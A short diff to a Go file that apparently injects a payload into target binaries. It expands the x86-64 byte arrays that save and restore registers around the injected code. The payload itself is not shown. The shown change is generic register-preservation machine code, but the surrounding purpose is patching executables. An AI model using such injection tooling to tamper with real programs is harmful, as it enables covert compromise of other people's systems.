@@ -38,15 +38,39 @@ type targetBin struct {
 }
 
 var preserve64 = []byte {
-	0x57,       //push   %rdi
-	0x56,       //push   %rsi
-	0x52,       //push   %rdx
+	0x50,              //push   %rax
+	0x53,              //push   %rbx
+	0x52,              //push   %rdx
+	0x56,              //push   %rsi
+	0x57,              //push   %rdi
+	0x55,              //push   %rbp
+	0x54,              //push   %rsp
+	0x41, 0x50,        //push   %r8
+	0x41, 0x51,        //push   %r9
+	0x41, 0x52,        //push   %r10
+	0x41, 0x53,        //push   %r11
+	0x41, 0x54,        //push   %r12
+	0x41, 0x55,        //push   %r13
+	0x41, 0x56,        //push   %r14
+	0x41, 0x57,        //push   %r15
 }
 
 var restoration64 = []byte {
-	0x5a, 		//pop    %rdx
-	0x5e, 		//pop    %rsi
-	0x5f, 		//pop    %rdi
+	0x41, 0x5f,        //pop    %r15
+	0x41, 0x5e,        //pop    %r14
+	0x41, 0x5d,        //pop    %r13
+	0x41, 0x5c,        //pop    %r12
+	0x41, 0x5b,        //pop    %r11
+	0x41, 0x5a,        //pop    %r10
+	0x41, 0x59,        //pop    %r9
+	0x41, 0x58,        //pop    %r8
+	0x5c, 	           //pop    %rsp
+	0x5d, 	           //pop    %rbp
+	0x5f,              //pop    %rdi
+	0x5e,              //pop    %rsi
+	0x5a,              //pop    %rdx
+	0x5b,              //pop    %rbx
+	0x58,              //pop    %rax
 }
 
 var defaultPayload64 = []byte{
